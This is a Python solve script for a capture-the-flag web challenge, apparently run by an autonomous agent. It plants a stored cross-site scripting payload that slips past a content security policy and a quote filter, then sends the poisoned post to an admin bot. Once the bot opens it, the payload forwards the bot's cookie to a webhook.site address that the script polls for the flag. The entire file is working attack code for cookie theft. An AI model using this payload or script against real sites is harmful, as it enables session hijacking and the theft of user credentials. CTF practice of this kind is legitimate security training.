# solve.py
import requests
import time
import re
import sys
from urllib.parse import unquote

print("[*] Initiating autonomous XSS attack sequence...")

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AutonomousAgent/1.0'}

# 1. Provision ephemeral webhook endpoint
try:
    print("[*] Provisioning ephemeral webhook.site endpoint...")
    res = requests.post("https://webhook.site/token", headers={'Accept': 'application/json'}, timeout=10)
    uuid = res.json()["uuid"]
    webhook_url = f"https://webhook.site/{uuid}"
    print(f"[+] Webhook established: {webhook_url}")
except Exception as e:
    print(f"[-] Failed to provision webhook: {e}")
    sys.exit(1)

# 2. Craft Payload
# <input autofocus> triggers onfocus instantly. window.location bypasses connect-src 'none'.
# Double quotes for HTML attributes, backticks for JS string bypasses single-quote restriction.
payload = f'<input autofocus onfocus="window.location=`{webhook_url}/?c=`+document.cookie">'
print(f"[*] Payload crafted: {payload}")

# 3. Inject payload into a new post
s = requests.Session()
print("[*] Hijacking session and injecting payload into database...")
s.get("https://onpoint.chals.cyberjousting.com/", timeout=10)
s.post("https://onpoint.chals.cyberjousting.com/add", data={"content": payload}, timeout=10)

# 4. Extract Post ID
home_req = s.get("https://onpoint.chals.cyberjousting.com/", timeout=10)
post_ids = re.findall(r'/getpost\?id=([0-9a-f]+)', home_req.text)

if not post_ids:
    print("[-] Exploit failed: Could not retrieve injected Post ID.")
    sys.exit(1)
    
post_id = post_ids[-1]
target_url = f"https://onpoint.chals.cyberjousting.com/getpost?id={post_id}"
print(f"[+] Payload injected successfully. Poisoned URL: {target_url}")

# 5. Submit to Admin Bot
print("[*] Transmitting Poisoned URL to Admin Bot...")
bot_res = requests.post("https://admin.chals.cyberjousting.com/report", data={"url": target_url}, timeout=10)
if bot_res.status_code == 200:
    print("[+] URL accepted by Admin Bot.")
else:
    print("[-] Bot response indicates possible delay, monitoring anyway...")

# 6. Poll for Cookie Exfiltration
print("[*] Awaiting execution and callback from Admin Bot (timeout 60s)...")
for i in range(30):
    time.sleep(2)
    try:
        reqs = requests.get(f"https://webhook.site/token/{uuid}/requests", headers={'Accept': 'application/json'}, timeout=10).json()
        if reqs.get("data"):
            for req in reqs["data"]:
                url_hit = req.get("url", "")
                if "?c=" in url_hit:
                    print(f"\n[+] BOOM! Callback received!")
                    
                    cookie_data = unquote(url_hit.split("?c=")[1])
                    
                    flag_match = re.search(r'(byuctf\{.*?\})', cookie_data)
                    if flag_match:
                        print(f"\n<FLAG>{flag_match.group(1)}</FLAG>\n")
                    else:
                        print(f"\n<FLAG>{cookie_data}</FLAG>\n")
                    sys.exit(0)
    except Exception:
        pass
    print(".", end="", flush=True)

print("\n[-] Timeout reached. No callback received.")
